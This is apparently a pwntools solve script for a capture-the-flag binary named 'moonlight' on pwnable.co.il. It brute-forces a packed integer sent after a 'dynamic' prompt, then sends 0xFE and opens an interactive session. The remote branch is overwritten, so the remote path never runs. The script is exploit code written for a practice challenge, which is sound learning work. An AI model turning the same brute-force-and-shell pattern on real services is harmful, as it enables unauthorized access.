from pwn import * 


context.binary = elf = ELF('./moonlight')
context.log_level = 'DEBUG'

if args['REMOTE']: 
    io = remote('pwnable.co.il', 9008)
else: 
    io = process([elf.path])
    gdb.attach(io)


for i in range(255):
    try: 
        io = process([elf.path])
        payload = p32(i)
        io.recvuntil('dynamic\n')
        io.sendline(payload)
        io.recv()
    except EOFError: 
        continue
    else:      
        print(i)
        break

io = process([elf.path])
payload = p32(0xFE)
io.recvuntil('dynamic\n')
io.sendline(payload)
io.interactive()